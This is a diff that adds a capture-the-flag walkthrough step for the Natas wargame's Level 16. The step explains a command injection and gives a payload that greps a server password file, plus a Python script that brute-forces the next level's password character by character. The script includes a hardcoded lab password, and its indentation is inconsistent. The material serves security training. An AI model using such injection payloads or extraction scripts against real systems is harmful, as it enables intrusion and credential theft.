@@ -391,3 +391,76 @@ If the first character is "a", the page content will change to indicate the user
         		break
 
 This will build the password one character at a time until complete.
+
+### Natas Level 16 → Level 17  
+**Key Takeaways**: This level demonstrates command injection vulnerabilities. It highlights how unsanitized user input passed into system commands can allow attackers to execute unintended commands, potentially leaking sensitive information.
+
+**Procedure**
+
+1. Log in using the username `natas16` and the password obtained from Level 15.
+
+2. The page provides a search form with a `needle` parameter. This parameter is passed to a system command (e.g., `grep`) on the server.
+
+3. Observing the source code, we can see that the `needle` is not properly sanitized, allowing for command injection.
+
+4. Inject a payload to check if the password for Natas17 starts with a particular character. For example:
+    
+    		anythings$(grep ^h /etc/natas_webpass/natas17)
+    
+    If `grep` finds a match, the `anythings` string will not appear in the output.
+
+5. Automate this check by writing a script that:
+    - Iterates over all possible characters (`a-z`, `A-Z`, `0-9`).
+    - Sends a request with the injected `grep` command checking for the current prefix.
+    - Appends the character to the known password if the match is successful.
+    - Repeats until all 32 characters are discovered.
+
+6. Sample script (Credits: John Hammond): https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas16.py
+
+		#!/usr/bin/env python3
+		# -*- coding: utf-8 -*-
+
+		import requests
+		import time
+		from string import ascii_lowercase, ascii_uppercase, digits
+
+		characters = ascii_lowercase + ascii_uppercase + digits
+
+		username = 'natas16'
+		password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'
+
+		url = f'http://{username}.natas.labs.overthewire.org/'
+
+		session = requests.Session()
+
+		seen_password = []
+
+		while len(seen_password) < 32:
+    			found = False
+    			for character in characters:
+        			attempt = ''.join(seen_password) + character
+   				payload = f'anythings$(grep ^{attempt} /etc/natas_webpass/natas17)'
+   				try:
+            				response = session.post(url, data={'needle': payload}, auth=(username, password), timeout=10)
+            				content = response.text
+        			except requests.exceptions.RequestException as e:
+            				print(f"Request failed: {e}")
+            				time.sleep(1)
+            				continue
+
+        			if 'anythings' not in content:
+            				# grep matched → no change → correct char
+            				seen_password.append(character)
+            				print(f"[+] Found so far: {''.join(seen_password)}")
+            				found = True
+            				break
+
+        			time.sleep(0.1)
+
+    			if not found:
+        			print("[-] No matching character found. This shouldn't happen!")
+        			break
+
+		print(f"[✓] Final password: {''.join(seen_password)}")
+
+This will gradually build the password for the next level.
